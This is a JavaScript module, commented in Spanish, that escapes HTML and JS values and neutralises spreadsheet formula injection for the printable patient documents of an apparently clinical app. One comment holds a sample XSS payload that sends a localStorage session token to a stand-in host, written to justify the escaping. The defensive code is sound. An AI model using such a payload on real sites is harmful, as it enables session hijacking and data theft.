// ---------------------------------------------------------------------------
// ESCAPE DE HTML
// ---------------------------------------------------------------------------
// Los documentos imprimibles se arman con document.write() porque necesitan su
// propio <style> y maquetacion de papel. Eso obliga a que TODO dato que entre
// en esas plantillas pase antes por aqui: sin esto, un nombre de paciente como
//   MARIA<script>fetch('https://ejemplo/?t='+localStorage.getItem('...'))</script>
// se ejecutaria dentro de la ventana de impresion, que hereda el origen de la
// aplicacion, y podria leer el token de sesion guardado por Supabase.
//
// Regla: esc() para texto que va dentro de HTML. Para construir nodos con
// datos, preferi textContent (ver imprimirVentana.js), que no necesita escape.
// ---------------------------------------------------------------------------

const ENTIDADES = {
  '&': '&amp;',
  '<': '&lt;',
  '>': '&gt;',
  '"': '&quot;',
  "'": '&#39;'
};

/** Escapa un valor para interpolarlo dentro de una plantilla HTML. */
export const esc = valor =>
  valor === null || valor === undefined
    ? ''
    : String(valor).replace(/[&<>"']/g, caracter => ENTIDADES[caracter]);

/**
 * Escape para valores que se incrustan DENTRO de un <script> en el documento
 * impreso (codigos de barras, por ejemplo). Ahi las entidades HTML no se
 * decodifican, asi que hace falta un literal de JavaScript correcto.
 */
export const escJs = valor => JSON.stringify(String(valor ?? ''));

/**
 * Sanea lo que el usuario ESCRIBE, antes de guardarlo.
 *
 * Es la primera de las tres capas: si el marcado nunca entra en la base, ni el
 * recibo, ni el HTML de la app, ni un futuro export tienen que defenderse. Un
 * nombre de paciente no necesita < > ni comillas, asi que aqui se eliminan en
 * lugar de codificarse: es mas legible para quien lo consulta y evita arrastrar
 * &amp; por toda la aplicacion.
 */
export const limpiarHtml = valor =>
  valor === null || valor === undefined
    ? ''
    : String(valor).replace(/[<>'"]/g, '');

/**
 * Neutraliza la inyeccion de formulas en la hoja de calculo (CSV Injection).
 *
 * Entrecomillar el valor NO basta: Excel sigue interpretando como formula una
 * celda que empieza por = + - @ o por un tabulador. Si el optometra abre el
 * archivo con macros habilitadas, el payload se ejecuta al abrirlo. Anteponer un
 * apostrofo le dice a la hoja de calculo "esto es texto".
 *
 * Solo importa el PRIMER caracter: un '+' en medio de "ANCA+1" es inofensivo.
 */
export const neutralizarFormula = valor => {
  const texto = valor === null || valor === undefined ? '' : String(valor);
  return /^[=+\-@\t\r]/.test(texto) ? `'${texto}` : texto;
};